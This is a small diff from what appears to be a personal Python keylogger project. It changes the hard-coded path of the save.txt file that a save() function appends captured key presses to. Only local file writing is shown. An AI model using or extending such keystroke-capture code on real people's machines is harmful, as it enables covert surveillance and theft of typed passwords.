@@ -24,7 +24,7 @@ def save(keys):
     '''
     Saves the key presses to a save.txt file.
     '''
-    with open("/home/joey/JoeyRepositories/Python-Projects/completed/keylogger/save.txt", "a") as file:
+    with open("/home/joey/JoeyRepositories/Python-Projects/keylogger/save.txt", "a") as file:
         for key in keys:
             key = str(key).replace("'", "")
             if key.find("space") > 0:
